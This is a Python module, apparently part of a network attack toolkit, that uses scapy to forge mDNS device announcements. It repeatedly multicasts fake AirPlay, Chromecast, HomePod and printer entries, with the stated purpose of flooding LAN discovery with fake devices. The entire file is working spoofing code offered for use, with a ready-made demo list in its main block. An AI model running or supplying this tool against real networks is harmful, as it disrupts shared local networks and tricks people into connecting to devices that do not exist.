# THIS MODULE WILL BE USED TO SEND FAKE MDNS DEVICE ANNOUNCEMENTS


# ETC IMPORTS
from scapy.all import IP, UDP, DNS, DNSRR, send
import threading
import time


# NSM MODULES
from vars import Variables


# CONSTANTS
console   = Variables.console
MDNS_IP   = "224.0.0.251"
MDNS_PORT = 5353
TTL       = 120


class Spoofer():
    """Sends fake mDNS announcements to flood LAN discovery with fake devices"""


    @classmethod
    def _send(cls, name, service):

        record = f"{name}.{service}.local.".encode()

        pkt = (
            IP(dst=MDNS_IP) /
            UDP(sport=MDNS_PORT, dport=MDNS_PORT) /
            DNS(
                qr=1,
                aa=1,
                ancount=1,
                an=DNSRR(
                    rrname=record,
                    type="PTR",
                    ttl=TTL,
                    rdata=record
                )
            )
        )

        send(pkt, verbose=False)


    @classmethod
    def spam(cls, devices, interval=110):

        console.print(f"\n[bold green][+] Starting mDNS spoof — {len(devices)} fake devices\n")

        def loop():

            while True:

                for name, service in devices:
                    cls._send(name=name, service=service)
                    console.print(f"[cyan][SPOOF][/cyan] Announced: [bold]{name}[/bold] → {service}.local")

                time.sleep(interval)

        threading.Thread(target=loop, daemon=True).start()


    @classmethod
    def once(cls, devices):

        console.print(f"\n[bold green][+] Sending {len(devices)} fake mDNS announcements\n")

        for name, service in devices:
            cls._send(name=name, service=service)
            console.print(f"[cyan][SPOOF][/cyan] Sent: [bold]{name}[/bold] → {service}.local")




if __name__ == "__main__":

    fake_devices = [
        ("Jabari's Apple TV",       "_airplay._tcp"),
        ("Living Room HomePod",     "_raop._tcp"),
        ("Samsung Frame 55",        "_googlecast._tcp"),
        ("HP LaserJet Pro M404",    "_ipp._tcp"),
        ("Bedroom Chromecast",      "_googlecast._tcp"),
        ("Kitchen HomePod Mini",    "_raop._tcp"),
    ]

    Spoofer.spam(devices=fake_devices)

    try:
        while True: time.sleep(1)
    except KeyboardInterrupt:
        console.print("\n[red][!] Stopped[/red]")
